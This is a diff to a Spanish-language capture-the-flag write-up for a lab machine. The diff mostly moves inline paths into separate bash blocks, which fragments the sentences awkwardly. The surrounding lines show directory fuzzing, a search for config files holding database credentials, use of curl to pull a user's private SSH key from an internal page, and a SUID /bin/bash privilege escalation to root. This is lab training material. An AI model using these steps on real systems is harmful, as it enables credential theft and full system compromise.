@@ -61,7 +61,11 @@ Es un Apache 2.4.29 en un Ubuntu.
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.171`, Vemos la Apache2 default page.
+Si entramos en la url 
+```bash
+ http://10.10.10.171 
+```
+, Vemos la Apache2 default page.
 
 #### Fuzzing con WFuzz {-}
 
@@ -69,10 +73,26 @@ Si entramos en la url `http://10.10.10.171`, Vemos la Apache2 default page.
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.171/FUZZ
 ```
 
-Vemos un directorio `/arcwork` que no nos muestra gran cosa. Tambien vemos un directorio `/music` y vemos que el login nos lleva a un directorio
-`/ona`
+Vemos un directorio 
+```bash
+ /arcwork 
+```
+ que no nos muestra gran cosa. Tambien vemos un directorio 
+```bash
+ /music 
+```
+ y vemos que el login nos lleva a un directorio
 
-Pinchamos y llegamos a un panel de administracion de `opennetadmin`
+```bash
+ /ona 
+```
+
+
+Pinchamos y llegamos a un panel de administracion de 
+```bash
+ opennetadmin 
+```
+
 ## Vulnerability Assessment {-}
 
 
@@ -175,9 +195,25 @@ ls
 find \-type f 2>/dev/null | grep "config"
 ```
 
-Aqui no hemos podido entrar en los directorios de los usuarios, y en el directorio internal del `/var/www`. Hemos visto
-quel directorio `/var/www/ona` era un link symbolico a `/opt/ona/www` y buscando por archivos conteniendo config en su nombre,
-hemos caido en un fichero `database_settings.inc.php` que contiene credenciales.
+Aqui no hemos podido entrar en los directorios de los usuarios, y en el directorio internal del 
+```bash
+ /var/www 
+```
+. Hemos visto
+quel directorio 
+```bash
+ /var/www/ona 
+```
+ era un link symbolico a 
+```bash
+ /opt/ona/www 
+```
+ y buscando por archivos conteniendo config en su nombre,
+hemos caido en un fichero 
+```bash
+ database_settings.inc.php 
+```
+ que contiene credenciales.
 
 ```bash
 grep "sh$" /etc/passwd
@@ -192,7 +228,11 @@ en el usuario **joanna**.
 id
 ```
 
-Aqui vemos quel usuario es parte del grupo **internal**. Miramos lo que hay en el directorio `/var/www/internal`
+Aqui vemos quel usuario es parte del grupo **internal**. Miramos lo que hay en el directorio 
+```bash
+ /var/www/internal 
+```
+
 
 ```bash
 cd /var/www/internal
@@ -233,7 +273,11 @@ Aqui vemos que podemos acceder a la web internal.
     joanna
     ```
 
-En el fichero `main.php` vemos que hace un echo de la id_rsa de joanna. Lo miramos con curl
+En el fichero 
+```bash
+ main.php 
+```
+ vemos que hace un echo de la id_rsa de joanna. Lo miramos con curl
 
 ```bash
 curl localhost:52846/main.php
@@ -286,7 +330,11 @@ chmod 4755 /bin/bash
 Enter
 ```
 
-Ya podemos ver que la `/bin/bash` tiene privilegios SUID y que podemos convertirnos en root para leer la flag
+Ya podemos ver que la 
+```bash
+ /bin/bash 
+```
+ tiene privilegios SUID y que podemos convertirnos en root para leer la flag
 
 ```bash
 ls -la /bin/bash
